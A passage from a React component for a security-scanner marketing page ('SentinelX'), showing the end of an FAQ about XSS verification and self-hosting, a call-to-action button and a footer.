                                a: "We hate them too. Our engine uses a 'Verifier' module. If we find a potential XSS, we spin up a headless browser to see if the script actually executes. If it doesn't, we don't report it. Our false-positive rate is <1%."
                            },
                            {
                                q: "Can I self-host this?",
                                a: "Yes! Our Enterprise 'On-Prem' plan delivers SentinelX as a set of Kubernetes manifests or a Docker Compose file. You keep all the data within your VPC."
                            }
                        ].map((faq, i) => (
                            <div key={i} className="bg-card/20 border border-border/50 rounded-xl overflow-hidden hover:border-primary/30 transition-colors">
                                <details className="group">
                                    <summary className="flex justify-between items-center p-6 cursor-pointer font-medium text-lg list-none selection:bg-none">
                                        {faq.q}
                                        <ChevronDown className="h-5 w-5 text-muted-foreground transition-transform group-open:rotate-180" />
                                    </summary>
                                    <div className="px-6 pb-6 text-muted-foreground leading-relaxed animate-in slide-in-from-top-2">
                                        {faq.a}
                                    </div>
                                </details>
                            </div>
                        ))}
                    </div>
                </div>

                <div className="mt-24 text-center">
                    <h2 className="text-2xl font-bold mb-6">Ready to upgrade your security stack?</h2>
                    <Link to="/">
                        <Button size="lg" className="rounded-full px-8 py-6 text-lg shadow-xl shadow-primary/20 hover:shadow-primary/40 transition-all">
                            Start Free Scan
                        </Button>
                    </Link>
                </div>
            </main >

            <footer className="py-12 border-t border-border/50 bg-muted/10">
                <div className="container mx-auto px-6 text-center text-muted-foreground">
                    <p>© 2026 SentinelX Inc. All rights reserved.</p>
                </div>
            </footer>
        </div >
    );
};

export default ComparisonPage;
